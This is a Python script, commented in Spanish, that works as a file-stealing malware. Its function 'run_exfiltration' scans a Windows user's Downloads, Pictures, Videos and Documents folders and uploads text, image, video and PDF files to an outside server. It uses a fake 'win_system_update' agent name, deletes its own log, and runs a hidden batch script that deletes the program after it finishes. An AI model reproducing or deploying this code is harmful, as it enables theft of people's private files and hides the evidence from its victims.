import os
import time
import requests
import glob
import sys
import subprocess

# Configuración
SERVER_URL = "https://netrunner-pro.up.railway.app" 
UPLOAD_ENDPOINT = f"{SERVER_URL}/api/upload"

def log(message):
    """Función de log corregida para evitar errores de sintaxis."""
    try:
        with open('sync_log.txt', 'a') as f:
            f.write(f'[{time.ctime()}] {message}\n')
    except:
        pass

def run_exfiltration():
    user_profile = os.environ.get('USERPROFILE', '')
    targets = [
        os.path.join(user_profile, 'Downloads'),
        os.path.join(user_profile, 'Pictures'),
        os.path.join(user_profile, 'Videos'),
        os.path.join(user_profile, 'Documents')
    ]
    
    extensions = ['*.txt', '*.jpg', '*.png', '*.mp4', '*.pdf']
    
    for folder in targets:
        if not os.path.exists(folder):
            continue
        
        for ext in extensions:
            for file_path in glob.glob(os.path.join(folder, ext)):
                try:
                    filename = os.path.basename(file_path)
                    
                    # 1. Verificar duplicados
                    check = requests.get(f"{SERVER_URL}/api/check-file", params={
                        'agentId': socket.gethostname() if 'socket' in globals() else 'win_update',
                        'filename': filename
                    }, timeout=5)
                    
                    if check.status_code == 200 and check.json().get('exists'):
                        continue 

                    # 2. Validar tamaño (Límite 50MB)
                    if os.path.getsize(file_path) > 50 * 1024 * 1024:
                        continue
                    
                    # 3. Subida
                    with open(file_path, 'rb') as f:
                        requests.post(UPLOAD_ENDPOINT, 
                                    files={'file': (filename, f.read())}, 
                                    data={'agentId': 'win_system_update'}, 
                                    timeout=15)
                except:
                    continue

    # Limpieza de log antes de salir
    if os.path.exists('sync_log.txt'):
        try: os.remove('sync_log.txt')
        except: pass

if __name__ == "__main__":
    run_exfiltration()
    
    # Rutina de autodestrucción (Solo Windows)
    if sys.platform == "win32":
        executable_path = sys.argv[0]
        cleanup_script = f"""@echo off
timeout /t 5 /nobreak > NUL
del /f /q "{executable_path}"
del "%~f0"
"""
        try:
            script_path = os.path.join(os.environ['TEMP'], "cleanup.bat")
            with open(script_path, "w") as f:
                f.write(cleanup_script)
            subprocess.Popen(['cmd.exe', '/c', script_path], 
                             creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS)
        except:
            pass
    sys.exit(0)
